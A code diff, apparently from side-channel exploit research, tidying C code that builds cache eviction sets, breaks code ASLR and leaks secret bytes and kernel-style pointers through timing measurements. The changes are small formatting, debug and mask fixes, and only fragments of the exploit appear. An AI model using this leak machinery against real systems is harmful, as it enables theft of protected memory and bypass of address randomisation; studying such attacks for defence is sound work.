@@ -21,9 +21,9 @@
 
 uint64_t break_code_aslr(uint64_t *);
 
-#define PAGE_4K (4096UL)
-#define PAGE_2M (512 * PAGE_4K)
-#define PAGE_1G (512 * PAGE_2M)
+#define PAGE_4K     (4096UL)
+#define PAGE_2M     (512 * PAGE_4K)
+#define PAGE_1G     (512 * PAGE_2M)
 #define PROT_RW     (PROT_READ | PROT_WRITE)
 #define PROT_RWX    (PROT_RW | PROT_EXEC)
 #define PG_ROUND(n) (((((n) - 1UL) >> 12) + 1) << 12)
@@ -47,7 +47,7 @@ uint64_t break_code_aslr(uint64_t *);
 #define GADGET_OFFSET_1          0x0
 #define GADGET_OFFSET_2          0x0
 #define NEXT_POINTER_OFFSET_2    0x2b50
-#define EViCT_MEM_ADDR 0x700000000000
+#define EViCT_MEM_ADDR           0x700000000000
 
 // automate the key selection when running evaluation
 #ifdef AUTOMATIC_KEY_SELECTION
@@ -203,7 +203,6 @@ uint64_t measure_self_eviction(volatile uint64_t **eviction_set) {
         measurements[i] = end - start;
     }
     uint64_t median = stats_median_u64(measurements, NUM_MEASUREMENTS);
-    // printf("median: %03ld\n", median);
 
     return median;
 }
@@ -223,7 +222,6 @@ uint8_t check_cross_eviction(volatile uint64_t **eviction_set_1,
         eviction_set[i] = eviction_set_2[i];
     }
     uint64_t total_time = measure_self_eviction(eviction_set);
-    // printf("total_time: %ld\n", total_time);
 
     return total_time > baseline + 200;
 }
@@ -420,7 +418,6 @@ uint8_t check_byte_thresh(actxt_t *actxt, uint64_t secret_ptr, uint64_t rounds,
 uint8_t leak_byte(actxt_t *actxt, uint64_t secret_ptr, uint8_t *byte) {
     actxt_t sctxt = *actxt;
 
-    int chain_start;
 #define DOWN_EXTEND 64
 #define UP_EXTEND   8
 #define CHECK_RANGE (256 + DOWN_EXTEND + UP_EXTEND)
@@ -431,8 +428,10 @@ uint8_t leak_byte(actxt_t *actxt, uint64_t secret_ptr, uint8_t *byte) {
     }
 
     // find a long chain that might wrap around
-    chain_start = -1;
-
+    int chain_start = -1;
+#ifdef DEBUG_LEAK
+    int chain_end = -1;
+#endif
     int maybe_start = -1;
     int maybe_end = -1;
     int chain_size = 0;
@@ -470,6 +469,9 @@ uint8_t leak_byte(actxt_t *actxt, uint64_t secret_ptr, uint8_t *byte) {
             }
             miss_count += 1;
             if (miss_count >= 3) {
+#ifdef DEBUG_LEAK
+                chain_end = maybe_end;
+#endif
                 maybe_start = -1;
             }
         }
@@ -480,6 +482,7 @@ uint8_t leak_byte(actxt_t *actxt, uint64_t secret_ptr, uint8_t *byte) {
     uint8_t start_byte = ((chain_start + (256 + 55 - DOWN_EXTEND)) % 256);
     *byte = start_byte;
 #ifdef DEBUG_LEAK
+    uint8_t end_byte = ((chain_end + (256 + -13 - DOWN_EXTEND)) % 256);
     if (start_byte != end_byte) {
         printf("disagreement: %u != %u\n", start_byte, end_byte);
     }
@@ -532,7 +535,7 @@ uint64_t leak_pointer_reliably(actxt_t *ctxt, uint64_t secret_base_ptr,
     }
 
     // filter out clearly invalid pointers (when using 48-bit virtual addresses)
-    if (ptr & 0xFFFF100000000000ul) {
+    if (ptr & 0xFFFF800000000000ul) {
         return 0;
     }
 
@@ -620,9 +623,8 @@ uint8_t resolve_object(actxt_t *ctxt, uint64_t parent_obj, uint64_t *result_ptr,
         printf("auto selected index: %d\n", index);
     }
     if (index < 0 || index >= size) {
-        UARF_LOG_ERROR("Invalid choice: %d/%d", index, size);
+        UARF_LOG_ERROR("Invalid choice: %d/%d\n", index, size);
     }
-
     printf("%s->table", label_parent);
 
     uint64_t hash_table_value_ptr_ptr = hash_table_ptr + 0x30;
@@ -833,7 +835,7 @@ int main(int argc, char const *argv[]) {
     printf("rb: %s, [%lu]: %lu\n", gen_rb_heat(), maxi, rb_hist[maxi]);
 #endif
     if (maxi != SECRET || rb_hist[SECRET] < ROUNDS / 2) {
-        UARF_LOG_ERROR("not hitting it right");
+        UARF_LOG_ERROR("not hitting it right\n");
         return 1;
     }
 #ifdef DEBUG_HIT
